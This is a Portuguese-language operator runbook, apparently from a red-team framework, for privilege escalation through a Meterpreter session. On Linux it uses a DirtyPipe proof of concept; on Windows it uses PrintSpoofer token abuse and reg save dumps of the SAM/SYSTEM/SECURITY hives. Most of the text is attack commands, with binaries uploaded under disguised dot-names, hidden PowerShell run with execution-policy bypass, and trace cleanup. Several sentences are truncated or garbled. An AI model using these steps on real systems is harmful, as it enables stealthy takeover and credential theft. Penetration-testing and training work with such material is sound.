# USAGE — phase 07 plugins

## 1. Pré-requisitos
Runners canônicos na fase 06 (não duplicados aqui). Sessão Meterpreter ativa.
Ferramentas operador-side: gcc (PoC DirtyPipe), binário potato-class auditado.

## 2. Fluxo padrão (idêntico à fase 06)
ingest → validate → execute → evidence, com os mesmos exit codes
(0/2/3/4/5). Ver USAGE da fase 06 para o passo a passo base.

# USAGE — phase 07 plugins (v0502_dirtypipe.sh / v0503_token_abuse.ps1)

Os runners canônicos são os da fase 06 (frame único, auditado uma vez).
Esta fase só adiciona plugins. Ponto o `--findings`/`-FindingsDir` para a
evidence desta fase.

---

## 3. Linux — V-05-02 DirtyPipe (contingência crash-risk)

### 3.1 Validar (offline, silencioso, seguro)

```bash
cd 07_privilege_escalation/scripts
# via runner da fase 06:
../06_exploitation/exploit_runner.sh --vector V-05-02 \
  --plugin vectors/v0502_dirtypipe.sh --validate-only \
  --findings ./evidence
3.2 Pré-requisitos do operador (GO/NO-GO)
O plugin rec

CONFIRM_RISK=1— decisão humana
RECOVERY_PLAN=FILE— plano de recuperação contendo as três exigências obrigatórias:session.recovery, crash.handling, evidence.preservation. Plano incompleto = recusa. Sem
E o binário do PoC compilado no operador, atualizado com nome neutro:

bash



# no Kali (lab):
git clone https://github.com/Arinerron/ CVE-2022-0847 PoC  # ou equivalente auditado
gcc dirtypipe.c -o dirtypipe
meterpreter > upload dirtypipe /tmp/.sys-upd
3.3 Execução
bash



CONFIRM_RISK=1 RECOVERY_PLAN=./recovery_plan.md EXPLOIT_BIN=/tmp/.sys-upd \
  ../06_exploitation/exploit_runner.sh --vector V-05-02 \
  --plugin vectors/v0502_dirtypipe.sh --findings ./evidence --output /tmp/.sys-07
echo $?   # 0 = root via dirty pipe | 4 = falhou (PARE; crash-risk não tem retry)
3.4 Limpeza
bash



rm -rf /tmp/.sys-07 /tmp/.sys-upd
4. Windows — Abuso do token V-05-PRIV
4.1 Validar (detecção de ramificação: sebackup vs seimpersonate)
texto



meterpreter > execute -f powershell.exe -a \
  "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\.sys-plug.ps1 validate"
# lê validation.txt: branch=<sebackup|seimpersonate|none>
4.2 SeImpersonate: estágio do binário batata (doutrina: oper
bash



# no Kali: SweetPotato/PrintSpoofer release auditada
meterpreter > upload PrintSpoofer64.exe C:\Windows\Temp\.sys-potato.exe
4.3 Execução via corredor da fase
texto



meterpreter > upload ../06_exploitation/exploit_runner.ps1 C:\Windows\Temp\.sys-run.ps1
meterpreter > execute -f powershell.exe -a \
  "-NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\.sys-run.ps1 \
   -Vector V-05-PRIV -Plugin C:\Windows\Temp\.sys-plug.ps1 \
   -FindingsDir C:\Windows\Temp\.sys-07 -OutputDir C:\Windows\Temp\.sys-07out"
Branches (o plugin escolhe e LOGA o porqu

sebackup→ reg savede SAM/SYSTEM/SECURITY com prova de hash SHA
seimpersonate→whoamiSISTEMA como prova.
4.4 Limpeza
texto



del C:\Windows\Temp\.sys-run.ps1
del C:\Windows\Temp\.sys-plug.ps1
del C:\Windows\Temp\.sys-potato.exe
rmdir /s /q C:\Windows\Temp\.sys-07out
Regras de ouro (fase 07 específica)
Crash-risk (DirtyPipe) SEM --confirm-risk+ plano completo = recusa mecânica.
validatedo token abuse exige privilégios Enabled , não listado.
Pró
O ramo escolhido é sempre logado com o motivo (nada implícito).
